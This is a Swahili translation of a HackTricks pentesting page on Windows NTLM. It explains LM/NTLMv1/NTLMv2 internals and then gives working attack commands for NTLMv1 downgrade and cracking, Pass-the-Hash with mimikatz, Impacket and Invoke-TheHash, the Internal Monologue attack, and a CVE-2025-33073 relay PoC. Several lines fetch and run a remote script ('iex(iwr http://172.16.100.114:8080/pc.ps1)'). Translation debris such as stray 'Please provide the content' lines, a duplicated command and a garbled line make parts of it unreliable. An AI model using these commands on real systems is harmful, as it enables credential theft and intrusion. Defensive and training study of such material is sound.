# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Maelezo ya Msingi

Katika mazingira ambamo **Windows XP na Server 2003** zinatumika, LM (Lan Manager) hashes hutumiwa, ingawa inatambulika kwa mapana kwamba hizi zinaweza kucompromise kwa urahisi. LM hash maalum, `AAD3B435B51404EEAAD3B435B51404EE`, huashiria hali ambapo LM haitumiki, na inawakilisha hash ya string tupu.

Kwa chaguo-msingi, itifaki ya authentication ya **Kerberos** ndiyo njia kuu inayotumiwa. NTLM (NT LAN Manager) hutumika katika hali maalum: kutokuwepo kwa Active Directory, domain kutokuwepo, Kerberos kutofanya kazi kwa sababu ya configuration isiyo sahihi, au wakati connections zinapojaribiwa kwa kutumia IP address badala ya hostname halali.

Kuwepo kwa header ya **"NTLMSSP"** kwenye network packets huashiria mchakato wa NTLM authentication.

Support kwa authentication protocols - LM, NTLMv1, na NTLMv2 - hutolewa na DLL maalum iliyoko kwenye `%windir%\Windows\System32\msv1\_0.dll`.

**Mambo Muhimu**:

- LM hashes ziko katika hatari, na LM hash tupu (`AAD3B435B51404EEAAD3B435B51404EE`) huashiria kwamba haitumiki.
- Kerberos ndiyo authentication method ya chaguo-msingi, huku NTLM ikitumika tu katika hali fulani.
- NTLM authentication packets zinaweza kutambuliwa kwa header ya "NTLMSSP".
- LM, NTLMv1, na NTLMv2 protocols zinaungwa mkono na system file `msv1\_0.dll`.

## LM, NTLMv1 na NTLMv2

Unaweza kuangalia na kusanidi ni protocol ipi itatumika:

### GUI

Tekeleza _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Kuna levels 6 (kutoka 0 hadi 5).

![LM, NTLMv1 na NTLMv2 - GUI: Tekeleza secpol.msc - Local policies - Security Options - Network Security: LAN Manager authentication level. Kuna levels 6 (kutoka 0 hadi 5)](<../../images/image (919).png>)

### Registry

Hii itaweka level 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Thamani zinazowezekana:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basic NTLM Domain authentication Scheme

1. **user** anaingiza **credentials** zake
2. Mashine ya client **inatuma authentication request** ikituma **domain name** na **username**
3. **server** inatuma **challenge**
4. **client inasimba** **challenge** kwa kutumia hash ya password kama key na kuituma kama response
5. **server inatuma** kwa **Domain controller** **domain name, username, challenge na response**. Ikiwa **hakuna** Active Directory iliyosanidiwa au domain name ni jina la server, credentials **zinakaguliwa locally**.
6. **domain controller inakagua ikiwa kila kitu ni sahihi** na kutuma taarifa kwa server

**server** na **Domain Controller** zinaweza kuunda **Secure Channel** kupitia server ya **Netlogon**, kwa sababu Domain Controller inajua password ya server (iko ndani ya db ya **NTDS.DIT**).

### Local NTLM authentication Scheme

Authentication ni kama ile iliyotajwa **hapo awali, lakini** **server** inajua **hash ya user** anayejaribu kufanya authentication ndani ya file la **SAM**. Kwa hiyo, badala ya kuomba kwa Domain Controller, **server itakagua yenyewe** ikiwa user anaweza kufanya authentication.

### NTLMv1 Challenge

**challenge ina urefu wa bytes 8** na **response ina urefu wa bytes 24**.

**NT hash (16bytes)** inagawanywa katika **sehemu 3 za 7bytes kila moja** (7B + 7B + (2B+0x00\*5)): **sehemu ya mwisho inajazwa zeros**. Kisha, **challenge** inasimbwa **kando** kwa kutumia kila sehemu na bytes za cipher zinazo **patikana zinaunganishwa**. Jumla: 8B + 8B + 8B = 24Bytes.

**Problems**:

- Ukosefu wa **randomness**
- Sehemu 3 zinaweza **kuattacked kando** ili kupata NT hash
- **DES inaweza ku-crackiwa**
- Key ya 3º inaundwa kila mara na **zeros 5**.
- Kwa **challenge ileile**, **response** itakuwa **ileile**. Kwa hiyo, unaweza kumpa victim string "**1122334455667788**" kama **challenge** na kuattack response ukitumia **precomputed rainbow tables**.

### NTLMv1 attack

Siku hizi inazidi kuwa nadra kupata environments zilizo na Unconstrained Delegation iliyosanidiwa, lakini hii haimaanishi kwamba huwezi **kuabuse Print Spooler service** iliyosanidiwa.

Unaweza kuabuse baadhi ya credentials/sessions ambazo tayari unazo kwenye AD ili **kuiomba printer ifanye authentication** dhidi ya **host iliyo chini ya udhibiti wako**. Kisha, ukitumia `metasploit auxiliary/server/capture/smb` au `responder`, unaweza **kuweka authentication challenge kuwa 1122334455667788**, kunasa authentication attempt, na ikiwa ilifanywa kwa kutumia **NTLMv1** utaweza **ku-crack**.\
Ikiwa unatumia `responder`, unaweza kujaribu **kutumia flag `--lm`** ili kujaribu **kudowngrade** **authentication**.\
_Note kwamba kwa technique hii authentication lazima ifanywe kwa kutumia NTLMv1 (NTLMv2 si valid)._

Kumbuka kwamba printer itatumia computer account wakati wa authentication, na computer accounts hutumia passwords **ndefu na za random** ambazo **huenda hutaweza kuzi-crack** kwa kutumia **dictionaries** za kawaida. Lakini **NTLMv1** authentication **hutumia DES** ([more info here](#ntlmv1-challenge)), kwa hiyo ukitumia services maalum zilizotengwa kwa ajili ya ku-crack DES utaweza ku-crack (kwa mfano unaweza kutumia [https://crack.sh/](https://crack.sh) au [https://ntlmv1.com/](https://ntlmv1.com)).

### NTLMv1 attack with hashcat

NTLMv1 pia inaweza kuvunjwa kwa kutumia NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), ambayo hufomati ujumbe wa NTLMv1 kwa njia inayoweza kuvunjwa kwa kutumia hashcat.<sup>[[1]](#references)</sup>

Command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Please provide the content to translate.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content to include in the file.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Endesha hashcat (distributed ni bora kupitia tool kama hashtopolis), kwa kuwa vinginevyo hii itachukua siku kadhaa.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Katika hali hii tunajua nenosiri la hii ni password, kwa hiyo tutadanganya kwa madhumuni ya demo:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Sasa tunahitaji kutumia hashcat-utilities kubadilisha des keys zilizopasuliwa kuwa sehemu za NTLM hash:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Please provide the last part you want translated.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Tafadhali tuma maandishi au sehemu unazotaka ziunganishwe pamoja.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Urefu wa challenge ni baiti 8** na **responses 2 hutumwa**: Moja ina urefu wa **baiti 24**, na urefu wa **nyingine** ni **wa kutofautiana**.

**Response ya kwanza** huundwa kwa kutumia HMAC_MD5 kuficha **string** inayoundwa na **client na domain**, na kutumia kama **key** **hash ya MD4** ya **NT hash**. Kisha, **matokeo** hutumika kama **key** ya kuficha **challenge** kwa kutumia HMAC_MD5. Kwa hili, **client challenge ya baiti 8 huongezwa**. Jumla: 24 B.

**Response ya pili** huundwa kwa kutumia **thamani kadhaa** (client challenge mpya, **timestamp** ili kuzuia **replay attacks**...)

Ikiwa una **pcap iliyorekodi mchakato wa authentication uliofanikiwa**, unaweza kufuata mwongozo huu ili kupata domain, username, challenge na response, na kujaribu kuvunja password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**Mara tu unapokuwa na hash ya victim**, unaweza kuitumia **kuiga utambulisho** wake.\
Unahitaji kutumia **tool** ambayo **itafanya** **NTLM authentication kwa kutumia** hiyo **hash**, **au** unaweza kuunda **sessionlogon** mpya na **kuingiza** hiyo **hash** ndani ya **LSASS**, ili wakati **NTLM authentication inapofanywa**, **hash hiyo itumike.** Chaguo la mwisho ndilo mimikatz hufanya.

**Tafadhali kumbuka kuwa unaweza pia kufanya mashambulizi ya Pass-the-Hash kwa kutumia Computer accounts.**

### **Mimikatz**

**Inahitaji kuendeshwa kama administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Hii itazindua mchakato ambao utamilikiwa na watumiaji waliomzindua mimikatz, lakini ndani ya LSASS credentials zilizohifadhiwa ni zile zilizo ndani ya parameters za mimikatz. Kisha, unaweza kufikia rasilimali za mtandao kana kwamba wewe ni huyo mtumiaji (sawa na mbinu ya `runas /netonly`, lakini huhitaji kujua password iliyo katika plain-text).

### Pass-the-Hash kutoka Linux

Unaweza kupata code execution kwenye mashine za Windows ukitumia Pass-the-Hash kutoka Linux.\
[**Fikia hapa ili ujifunze jinsi ya kufanya hivyo.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Zana za Impacket zilizocompilewa kwa Windows

Unaweza kupakua[ binaries za impacket za Windows hapa](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Katika hali hii unahitaji kubainisha command; cmd.exe na powershell.exe si halali kupata interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Kuna binaries nyingine kadhaa za Impacket...

### Invoke-TheHash

Unaweza kupata PowerShell scripts kutoka hapa: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Function hii ni **mchanganyiko wa zote nyingine**. Unaweza kupitisha **hosts kadhaa**, **kuwatenga** baadhi na **kuchagua** **option** unayotaka kutumia (_SMBExec, WMIExec, SMBClient, SMBEnum_). Ukichagua **SMBExec** au **WMIExec** lakini **usipotoa** parameter yoyote ya _**Command**_, itafanya tu **ukaguzi** wa kama una **ruhusa za kutosha**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Inahitaji kuendeshwa kama administrator**

Tool hii itafanya kitu kilekile kama mimikatz (kubadilisha memory ya LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Manual Windows remote execution with username na password


{{#ref}}
../lateral-movement/
{{#endref}}

## Kutoa credentials kutoka Windows Host

**Kwa maelezo zaidi kuhusu** [**jinsi ya kupata credentials kutoka Windows host unapaswa kusoma ukurasa huu**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

Internal Monologue Attack ni mbinu ya siri ya kutoa credentials inayomwezesha mshambuliaji kupata NTLM hashes kutoka kwenye mashine ya mwathiriwa **bila kuingiliana moja kwa moja na mchakato wa LSASS**. Tofauti na Mimikatz, ambayo husoma hashes moja kwa moja kutoka kwenye memory na mara nyingi huzuiwa na endpoint security solutions au Credential Guard, attack hii hutumia **local calls kwenda kwenye NTLM authentication package (MSV1_0) kupitia Security Support Provider Interface (SSPI)**. Kwanza mshambuliaji **hushusha viwango vya NTLM settings** (kwa mfano, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) ili kuhakikisha kuwa NetNTLMv1 inaruhusiwa. Kisha hujifanya kuwa user tokens zilizopo zinazopatikana kutoka kwenye processes zinazoendelea, na kuanzisha NTLM authentication locally ili kuzalisha NetNTLMv1 responses kwa kutumia challenge inayojulikana.<sup>[[4]](#references)</sup>

Baada ya kunasa NetNTLMv1 responses hizi, mshambuliaji anaweza kurejesha NTLM hashes za awali haraka kwa kutumia **precomputed rainbow tables**, na hivyo kuwezesha Pass-the-Hash attacks zaidi kwa ajili ya lateral movement. Muhimu zaidi, Internal Monologue Attack hubaki kuwa ya siri kwa sababu haitengenezi network traffic, hai-inject code, wala kusababisha direct memory dumps, jambo linaloifanya iwe vigumu zaidi kwa defenders kuigundua ikilinganishwa na methods za kawaida kama Mimikatz.

Ikiwa NetNTLMv1 haikubaliki—kutokana na security policies zilizolazimishwa—mshambuliaji anaweza kushindwa kupata NetNTLMv1 response.

Ili kushughulikia hali hii, Internal Monologue tool ilisasishwa: hupata server token dynamically kwa kutumia `AcceptSecurityContext()` ili bado **inase NetNTLMv2 responses** ikiwa NetNTLMv1 itashindwa. Ingawa NetNTLMv2 ni ngumu zaidi ku-crack, bado hufungua njia kwa relay attacks au offline brute-force katika hali chache.

PoC inapatikana katika **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay na Responder

**Soma mwongozo wa kina zaidi kuhusu jinsi ya kufanya attacks hizo hapa:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Kuchanganua NTLM challenges kutoka kwenye network capture

**Unaweza kutumia** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM na Kerberos *Reflection* kupitia Serialized SPNs (CVE-2025-33073)

Windows ina mitigations kadhaa zinazojaribu kuzuia *reflection* attacks ambapo NTLM (au Kerberos) authentication inayotoka kwenye host inarelayiwa kurudi kwenye **host hiyo hiyo** ili kupata SYSTEM privileges.

Microsoft ilivunja chains nyingi za umma kupitia MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) na patches zilizofuata, hata hivyo **CVE-2025-33073** inaonyesha kuwa protections bado zinaweza bypassiwa kwa kutumia vibaya jinsi **SMB client inavyopunguza Service Principal Names (SPNs)** zilizo na *marshalled* (serialized) target-info.<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR ya bug
1. Mshambuliaji husajili **DNS A-record** ambayo label yake ina-encode marshalled SPN – kwa mfano:
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Mwathiriwa analazimishwa ku-authenticate kwenda kwenye hostname hiyo (PetitPotam, DFSCoerce, n.k.).
3. SMB client inapopitisha target string `cifs/srv11UWhRCAAAAA…` kwenda kwa `lsasrv!LsapCheckMarshalledTargetInfo`, call ya `CredUnmarshalTargetInfo` **huondoa** serialized blob, na kuacha **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (au Kerberos equivalent) sasa huichukulia target kuwa *localhost* kwa sababu sehemu fupi ya host inalingana na computer name (`SRV1`).
5. Kwa sababu hiyo, server huweka `NTLMSSP_NEGOTIATE_LOCAL_CALL` na kuingiza **LSASS’ SYSTEM access-token** kwenye context (kwa Kerberos, SYSTEM-marked subsession key huundwa).
6. Kurelay authentication hiyo kwa `ntlmrelayx.py` **au** `krbrelayx.py` kunatoa SYSTEM rights kamili kwenye host hiyo hiyo.<sup>[[5]](#references)</sup>

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch na Mitigations
* KB patch ya **CVE-2025-33073** inaongeza ukaguzi katika `mrxsmb.sys::SmbCeCreateSrvCall` unaozuia muunganisho wowote wa SMB ambao target yake ina taarifa za marshalled (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Tekeleza **SMB signing** ili kuzuia reflection hata kwenye hosts ambazo hazijafanyiwa patch.
* Fuatilia DNS records zinazofanana na `*<base64>...*` na zuia coercion vectors (PetitPotam, DFSCoerce, AuthIP...).

### Mawazo ya Detection
* Network captures zilizo na `NTLMSSP_NEGOTIATE_LOCAL_CALL` ambapo client IP ≠ server IP.
* Kerberos AP-REQ iliyo na subsession key na client principal iliyo sawa na hostname.
* Windows Event 4624/4648 SYSTEM logons zinazofuatwa mara moja na remote SMB writes kutoka host hiyo hiyo.<sup>[[5]](#references)</sup>

Kwa **March 2026** local reflection variant inayotumia **SMB arbitrary ports** na **TCP connection reuse** kufikia `NT AUTHORITY\SYSTEM`, tazama:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Marejeo
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Cracking an NTLMv2 Hash](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
